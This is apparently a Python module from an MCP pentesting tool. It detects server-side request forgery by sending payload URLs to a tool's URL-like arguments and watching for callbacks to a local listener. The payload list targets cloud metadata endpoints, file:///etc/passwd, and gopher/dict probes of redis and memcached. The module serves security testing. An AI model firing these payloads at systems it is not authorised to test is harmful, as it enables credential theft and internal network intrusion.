"""Server-Side Request Forgery tests via MCP tools.

A callback to the Mcpwn listener is strong evidence and marked verified.
Response-string heuristics are intentionally narrow (our own canary only) so a
tool that merely documents cloud metadata is not reported as SSRF.
"""
from __future__ import annotations

import logging
import threading
import time
import uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Dict, List, Optional

from core.evidence import make_finding
from core.protocol import (
    ProtocolError,
    RequestTimeout,
    SafetyLimitExceeded,
    TransportError,
    content_summary,
    result_text,
)

logger = logging.getLogger("mcpwn.ssrf")

URL_HINTS = ("url", "uri", "href", "link", "endpoint", "host", "target",
             "source", "webhook", "callback")
CANARY = "MCPWN-SSRF-CONFIRMED"


class SSRFTest:
    """Detect SSRF by injecting URLs pointing at a controlled listener."""

    SSRF_PAYLOADS = [
        "http://127.0.0.1:{port}/ssrf-test",
        "http://localhost:{port}/ssrf-test",
        "http://[::1]:{port}/ssrf-test",
        "http://0.0.0.0:{port}/ssrf-test",
        # Metadata endpoints: only a callback or canary proves reachability.
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "file:///etc/passwd",
        "dict://127.0.0.1:11211/stats",
        "gopher://127.0.0.1:6379/_INFO",
    ]

    def __init__(self, pentester):
        self.pentester = pentester
        self.server: Optional[ThreadingHTTPServer] = None
        self.server_port = 0
        self.captured_callbacks: Dict[str, dict] = {}
        self.callbacks_lock = threading.Lock()

    # -- listener --------------------------------------------------------
    def _start_listener(self) -> bool:
        parent = self

        class CallbackHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                if "/callback/" in self.path:
                    token = self.path.split("/callback/")[-1].split("/")[0]
                    with parent.callbacks_lock:
                        parent.captured_callbacks[token] = {
                            "path": self.path,
                            "headers": dict(self.headers),
                            "time": time.time(),
                        }
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(CANARY.encode())

            def log_message(self, *args):
                return

        for port in (0, 8888, 8889, 8890):
            try:
                self.server = ThreadingHTTPServer(
                    ("127.0.0.1", port), CallbackHandler)
                self.server.daemon_threads = True
                self.server_port = self.server.server_address[1]
                break
            except OSError as exc:
                logger.debug("SSRF listener port %s unavailable: %s",
                             port, exc)
                self.server = None
        if self.server is None:
            logger.warning("could not bind an SSRF callback listener")
            return False
        thread = threading.Thread(
            target=self.server.serve_forever, name="mcpwn-ssrf-listener",
            daemon=True)
        thread.start()
        return True

    # -- execution -------------------------------------------------------
    def run(self, tool):
        findings: List[dict] = []
        target = self.pentester.target_url
        callback_base = self.pentester.config.get("oob_callback_base")
        if target and not callback_base and not self._is_loopback(target):
            logger.info("Skipping SSRF: target is remote and no "
                        "--oob-callback-base was provided")
            return findings
        if not self.server and not self._start_listener():
            return findings

        host_base = callback_base or "http://127.0.0.1:{}".format(
            self.server_port)
        schema = tool.get("inputSchema", {}) or {}
        url_args = self._find_url_args(schema)
        if not url_args:
            return findings
        for arg in url_args:
            for template in self.SSRF_PAYLOADS:
                token = uuid.uuid4().hex[:10]
                payload = template.format(port=self.server_port)
                if payload.startswith("http") and "169.254" not in payload \
                        and "metadata.google" not in payload:
                    payload = "{}/callback/{}".format(
                        host_base.rstrip("/"), token)
                try:
                    response, _ = self.pentester.send(
                        "tools/call",
                        {"name": tool.get("name"),
                         "arguments": {arg: payload}},
                        skip_analysis=True,
                    )
                except (TransportError, ProtocolError, RequestTimeout,
                        SafetyLimitExceeded) as exc:
                    logger.debug("SSRF probe failed: %s", exc)
                    continue
                with self.callbacks_lock:
                    callback = self.captured_callbacks.pop(token, None)
                if callback:
                    findings.append(make_finding(
                        "SSRF_CALLBACK",
                        tool=tool.get("name"),
                        arg=arg,
                        payload=payload,
                        severity="CRITICAL",
                        confidence=95,
                        verified=True,
                        evidence=[
                            "callback from {}".format(
                                callback.get("headers", {}).get(
                                    "User-Agent", "unknown client")),
                            "path {}".format(callback.get("path", "")),
                        ],
                        note="server made an outbound request to the "
                             "controlled listener",
                    ))
                    break
                if CANARY in result_text(response):
                    findings.append(make_finding(
                        "SSRF_RESPONSE",
                        tool=tool.get("name"),
                        arg=arg,
                        payload=payload,
                        severity="HIGH",
                        confidence=85,
                        verified=True,
                        evidence=[content_summary(response, 300)],
                        note="tool returned the controlled listener's canary",
                    ))
                    break
        return findings

    @staticmethod
    def _is_loopback(url: str) -> bool:
        lowered = url.lower()
        return any(host in lowered for host in (
            "://127.0.0.1", "://localhost", "://[::1]"))

    def _find_url_args(self, schema):
        args = []
        for prop, spec in (schema.get("properties", {}) or {}).items():
            if any(hint in prop.lower() for hint in URL_HINTS):
                args.append(prop)
            elif isinstance(spec, dict) and spec.get("format") == "uri":
                args.append(prop)
        if not args and self.pentester.config.get("ssrf_all_args"):
            args = list((schema.get("properties", {}) or {}).keys())[:3]
        return args

    def cleanup(self):
        if self.server is not None:
            try:
                self.server.shutdown()
                self.server.server_close()
            except OSError as exc:
                logger.debug("SSRF listener cleanup error: %s", exc)
            finally:
                self.server = None
